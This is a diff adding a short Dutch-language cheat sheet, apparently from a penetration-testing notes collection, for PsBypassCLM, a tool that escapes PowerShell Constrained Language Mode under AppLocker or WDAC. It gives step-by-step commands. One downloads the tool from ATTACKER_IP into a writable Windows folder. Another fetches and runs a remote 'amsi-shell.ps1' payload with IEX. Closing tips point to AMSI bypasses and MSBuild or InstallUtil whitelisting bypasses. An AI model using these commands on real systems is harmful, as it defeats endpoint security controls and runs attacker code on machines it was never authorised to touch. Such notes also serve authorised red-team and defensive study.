@@ -1,0 +1,32 @@
+# PsBypassCLM — Constrained Language Mode bypass
+# Start PowerShell in Full Language Mode vanuit een CLM-beperkte context (AppLocker/WDAC)
+#
+# === Syntax ===
+# PsBypassCLM.exe
+#
+# === Werking ===
+# Spawnt een nieuwe PowerShell sessie in Full Language Mode
+# Omzeilt AppLocker Constrained Language Mode restricties
+# Geen argumenten nodig — voert automatisch bypass uit
+#
+# === Gebruik ===
+# Stap 1: Download naar beschrijfbare locatie
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/tools/PsBypassCLM.exe','c:\windows\tasks\PsBypassCLM.exe')
+# Stap 2: Draai vanuit CLM-beperkte sessie
+c:\windows\tasks\PsBypassCLM.exe
+# Stap 3: Controleer taalmode in nieuwe sessie
+$ExecutionContext.SessionState.LanguageMode
+# Verwacht resultaat: FullLanguage
+#
+# === Voorbeelden ===
+# Vanuit een beperkte PowerShell (CLM actief):
+PsBypassCLM.exe
+# Check huidige language mode:
+$ExecutionContext.SessionState.LanguageMode
+# Na bypass: laad willekeurige scripts
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')
+#
+# Tip: Gebruik in combinatie met AMSI bypass (amsi_bypass_patch/amsi_bypass_reflection)
+# Tip: AppLocker moet PowerShell scripts blokkeren voor CLM — anders is bypass niet nodig
+# Tip: Werkt niet als PowerShell zelf geblokkeerd is door AppLocker
+# Tip: Alternatief: MSBuild of InstallUtil bypass (zie applocker_msbuild/applocker_installutil)
